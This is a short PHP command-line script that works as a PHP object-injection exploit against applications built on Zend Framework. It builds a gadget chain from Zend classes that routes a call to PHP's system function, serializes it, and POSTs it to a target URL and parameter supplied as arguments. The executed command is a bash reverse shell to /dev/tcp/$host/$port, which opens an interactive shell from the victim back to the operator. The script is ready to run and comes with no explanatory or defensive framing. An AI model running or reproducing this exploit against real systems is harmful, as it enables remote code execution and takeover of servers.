#!/usr/bin/php
<?php

namespace {
  list($thisApp, $url, $host, $port, $postParam) = $argv;
}

namespace Zend\Http\Response {

    class Stream
    {
        protected $cleanup = true;
        protected $streamName;

        public function __construct($streamName)
        {
            $this->streamName = $streamName;
        }
    }
}

namespace Zend\View\Helper{
    class Gravatar{
        protected $view;
        protected $attributes;
        public function __construct($view, $attributes)
        {
            $this->view=$view;
            $this->attributes=$attributes;
        }
    }
}

namespace Zend\View\Renderer{
    class PhpRenderer{
        private $__helpers;
        public function __construct($__helpers)
        {
            $this->__helpers = $__helpers;
        }
    }
}

namespace Zend\Config{
    class Config{
        protected $data = [
            "escapehtml"=>'system'
        ];
    }
}

namespace {
    $d = new Zend\Config\Config();
    $c = new Zend\View\Renderer\PhpRenderer($d);
    $attr = ["/bin/bash -c 'bash -i >& /dev/tcp/$host/$port 0>&1'"=>1];
    $b = new Zend\View\Helper\Gravatar($c, $attr);
    $a = new Zend\Http\Response\Stream($b);

    $postdata = http_build_query(
        array(
            $postParam => serialize($a),
        )
    );

    $opts = array('http' =>
        array(
            'method'  => 'POST',
            'header'  => 'Content-Type: application/x-www-form-urlencoded',
            'content' => $postdata
        )
    );
    $context  = stream_context_create($opts);
    $result = file_get_contents($url, false, $context);
    echo $result;
}
